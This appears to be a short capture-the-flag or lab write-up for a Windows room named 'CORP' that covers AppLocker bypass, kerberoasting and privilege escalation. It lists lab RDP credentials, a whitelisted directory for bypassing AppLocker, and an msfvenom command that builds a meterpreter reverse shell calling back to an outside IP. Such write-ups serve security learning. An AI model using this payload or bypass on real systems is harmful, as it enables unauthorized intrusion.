# CORP

Bypass Windows Applocker and escalate your privileges. You will learn about kerberoasting, evading AV, bypassing applocker and escalating your privileges on a Windows system.


learn the following:

- Windows Forensics
- Basics of kerberoasting
- AV Evading
- Applocker

RDP Credentials:  
Username: corp\dark  
Password: _QuejVudId6  

## Bypassing Applocker

Bypassing Applocker depends on implemented rules

Default rules whitelist certain directories: `C:\Windows\System32\spool\drivers\color`

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.67.108.97 LPORT=8888 -f exe -o shell.exe

![Shell](/assets/corp-101.png)  

